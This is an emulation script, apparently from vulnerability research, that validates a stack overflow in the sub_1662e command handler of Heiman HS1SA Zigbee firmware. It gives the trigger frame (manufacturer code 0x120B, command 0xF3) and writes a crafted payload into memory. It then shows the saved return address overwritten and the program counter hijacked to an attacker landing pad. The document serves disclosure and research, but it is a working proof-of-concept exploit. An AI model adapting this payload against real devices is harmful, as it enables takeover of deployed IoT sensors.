:name: ZB-06 HS1SA sub_1662e overflow — emulation-based validation
:description: Drives the vulnerable manufacturer-command handler sub_1662e of the real Heiman HS1SA firmware on the emulated EFR32MG21 and demonstrates (1) the out-of-bounds write over the saved return address and (2) the resulting PC hijack when the function epilogue returns.
#
# RESULT (reproduced 2026-07-13):
#   saved-LR slot 0x20006FFC  ->  0x20006E01   (attacker-chosen, from payload records 34/35)
#   PC after epilogue pop      ->  0x20006E00   (attacker-controlled landing pad)
#
# The bug: sub_1662e reads an UNBOUNDED record count from payload[0x0a] and, for
# each record i, does `strh v20[i]` into a 32-byte stack array v20 (=SP+0x18).
# The saved LR sits at SP+0x5c = halfword index 34, so count>=36 overwrites the
# full return address with attacker halfwords payload[0x0b+2i]/payload[0x0c+2i].
#
# Gate contract (sub_a33c): reached by a single manufacturer-specific ZCL frame
# with mfgCode==0x120B, direction==0, cmdId==0xF3; it tail-calls
# sub_1662e(r0=payload_ptr, r1=remaining_len).
#
# NOTE ON METHOD: this harness invokes sub_1662e directly (function-level) with
# the exact register contract the gate uses, on unmodified firmware bytes. The
# OOB write is observed as it happens (step to the write) and the control-flow
# hijack is observed by executing the genuine `pop {..,pc}` epilogue at 0x16736.
# We reposition SP to the corrupted frame for the epilogue step because this
# particular crafted record stream keeps the per-record processing loop busy
# (records never satisfy the parser's completion path), so the function does not
# reach its own epilogue on its own — the memory-safety violation, however, has
# already occurred by then.

include @scripts/silabs-vuln/hs1sa.resc
logLevel 3

# Boot the firmware through clock/power/radio bring-up.
emulation RunFor "0.3"
pause

# Attacker landing pad: Thumb `wfe; wfe` (0xBF30) self-parking stub.
sysbus WriteDoubleWord 0x20006E00 0xBF30BF30

# Craft the malicious payload at 0x20006000.
#   [0x08]=0x01 outer segment count (<5)   [0x0a]=0x28=40 INNER RECORD COUNT (bug)
#   records 34/35 (bytes at 0x4d/0x4f high, 0x4e/0x50 low) carry target 0x20006E01
sysbus WriteDoubleWord 0x20006008 0x41280001
sysbus WriteDoubleWord 0x2000604C 0x6E414141
sysbus WriteDoubleWord 0x20006050 0x41002001

# Call frame exactly as gate sub_a33c would set up.
# SP=fresh scratch stack, LR=sentinel, r0=payload ptr, r1=remaining_len(>9)
sysbus.cpu SetRegister 13 0x20007000
sysbus.cpu SetRegister 14 0x00006E2F
sysbus.cpu SetRegister 0  0x20006000
sysbus.cpu SetRegister 1  0x00000060
sysbus.cpu PC 0x1662e

echo ">>> BEFORE: saved-LR slot @0x20006FFC ="
sysbus ReadDoubleWord 0x20006FFC

# Run the handler far enough to perform the overflow writes.
sysbus.cpu Step 2000

echo ">>> AFTER overflow: saved-LR slot @0x20006FFC (expect 0x20006E01) ="
sysbus ReadDoubleWord 0x20006FFC

# Execute the genuine epilogue `pop.w {r4-r11,pc}` at 0x16736 with SP pointing at
# the corrupted frame (PC is popped from SP+32 = 0x20006FFC).
sysbus.cpu SetRegister 13 0x20006FDC
sysbus.cpu PC 0x16736
sysbus.cpu Step 1

echo ">>> AFTER epilogue return: PC (expect 0x20006E00 landing pad) ="
sysbus.cpu PC
